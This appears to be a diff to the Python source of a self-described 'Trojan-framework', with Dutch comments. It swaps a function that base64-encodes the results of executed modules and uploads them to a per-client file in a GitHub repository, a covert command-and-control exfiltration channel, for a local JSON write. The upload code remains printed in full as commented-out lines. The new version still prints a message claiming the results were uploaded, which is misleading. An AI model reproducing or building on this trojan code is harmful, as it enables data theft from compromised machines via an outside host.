@@ -81,36 +81,62 @@ def execute_module(module_path):
         print(f"Fout bij uitvoeren van module {module_path}: {e}")
         return {"status": "error", "error_message": str(e)}
 
+# def send_results(data):
+#     # Upload de resultaten van een module naar de data-map in de GitHub-repo
+#     try:
+#         file_path = f"data/{CLIENT_ID}.json"
+#         url = f"{GITHUB_REPO}/contents/{file_path}"
+
+#         # Huidige inhoud ophalen
+#         response = requests.get(url, headers=HEADERS)
+#         if response.status_code == 200:
+#             sha = response.json()["sha"]
+#         else:
+#             sha = None  # Nieuw bestand
+
+#         # Data voorbereiden
+#         content = json.dumps(data)
+#         encoded_content = base64.b64encode(content.encode("utf-8")).decode("utf-8")
+#         payload = {
+#             "message": "Update module results",
+#             "content": encoded_content,
+#             "sha": sha
+#         }
+
+#         # Uploaden
+#         response = requests.put(url, headers=HEADERS, json=payload)
+#         if response.status_code in [200, 201]:
+#             print("Resultaten succesvol geüpload.")
+#         else:
+#             print(f"Fout bij uploaden: {response.status_code}")
+#     except Exception as e:
+#         print(f"Fout bij uploaden van resultaten: {e}")
+        
+        
 def send_results(data):
-    # Upload de resultaten van een module naar de data-map in de GitHub-repo
-    try:
-        file_path = f"data/{CLIENT_ID}.json"
-        url = f"{GITHUB_REPO}/contents/{file_path}"
+    # Pad naar het resultaatbestand
+    file_path = f"data/{CLIENT_ID}.json"
+    
+    # Controleer of het bestand al bestaat
+    if os.path.exists(file_path):
+        # Als het bestand al bestaat, lees de bestaande inhoud
+        with open(file_path, 'r') as file:
+            try:
+                existing_data = json.load(file)
+            except json.JSONDecodeError:
+                existing_data = []  # Maak een lege lijst als het bestand niet juist te lezen is
+    else:
+        # Als het bestand nog niet bestaat, maak een nieuwe lijst
+        existing_data = []
+    
+    # Voeg de nieuwe resultaten toe aan de bestaande data
+    existing_data.append(data)
+    
+    # Schrijf de bijgewerkte data naar het bestand
+    with open(file_path, 'w') as file:
+        json.dump(existing_data, file, indent=4)
 
-        # Huidige inhoud ophalen
-        response = requests.get(url, headers=HEADERS)
-        if response.status_code == 200:
-            sha = response.json()["sha"]
-        else:
-            sha = None  # Nieuw bestand
-
-        # Data voorbereiden
-        content = json.dumps(data)
-        encoded_content = base64.b64encode(content.encode("utf-8")).decode("utf-8")
-        payload = {
-            "message": "Update module results",
-            "content": encoded_content,
-            "sha": sha
-        }
-
-        # Uploaden
-        response = requests.put(url, headers=HEADERS, json=payload)
-        if response.status_code in [200, 201]:
-            print("Resultaten succesvol geüpload.")
-        else:
-            print(f"Fout bij uploaden: {response.status_code}")
-    except Exception as e:
-        print(f"Fout bij uploaden van resultaten: {e}")
+    print("Resultaten succesvol geüpload.")
 
 def main():
     # Hoofdfunctie van het Trojan-framework
